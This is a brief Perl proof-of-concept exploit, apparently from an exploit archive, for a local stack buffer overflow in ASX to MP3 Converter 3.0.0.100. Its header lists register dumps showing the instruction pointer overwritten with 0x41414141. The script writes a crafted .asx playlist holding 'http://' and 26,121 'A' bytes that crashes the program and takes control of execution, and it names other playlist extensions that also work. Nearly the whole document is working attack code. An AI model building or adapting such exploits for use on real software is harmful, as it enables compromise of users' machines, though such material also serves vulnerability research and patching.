#!/usr/bin/perl
# ASX to MP3 Converter Version 3.0.0.100 Local Stack Overflow POC
# Exploited By mat
#
#EAX 00000001
#ECX 41414141
#EDX 00D30000
#EBX 00333ED8
#ESP 000F6C90
#EBP 000FBFB4
#ESI 77C2FCE0 msvcrt.77C2FCE0
#EDI 00006619
#EIP 41414141
###################################################################

my $ex="http://"."\x41" x 26121;
###################################################################
open(MYFILE,'>>mat.asx'); # (.smi) (.smil) (.wpl) (.wax)
print MYFILE $ex;
close(MYFILE);
###################################################################